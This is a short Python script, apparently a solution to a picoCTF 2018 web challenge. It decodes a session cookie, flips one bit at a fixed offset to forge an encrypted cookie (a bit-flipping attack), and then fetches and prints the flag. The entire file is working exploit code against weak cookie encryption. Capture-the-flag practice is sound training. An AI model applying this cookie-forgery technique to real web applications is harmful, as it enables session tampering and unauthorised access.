from pwn import *
import requests

URL = "http://2018shell3.picoctf.com:43731"

s = requests.Session()
r = s.post(URL+"/login", data = {"user": '', "password": ''})

cookie = s.cookies['cookie']
cookie_decode = enhex(cookie.decode('base64'))

flip_num = int(cookie_decode[21], 16)
if flip_num%2:
	flip_num-=1
else:
	flip_num+=1

cookie_decode = cookie_decode[:21] + str(hex(flip_num)[2:]) + cookie_decode[22:]
new_cookie = unhex(cookie_decode).encode('base64').replace('\n', '')

s.cookies.set('cookie', None)
s.cookies.set('cookie', new_cookie)

r = s.get(URL + "/flag")
p = r.text.find('pico')
q = (r.text)[p:].find('}')+1

print (r.text)[p:p+q]
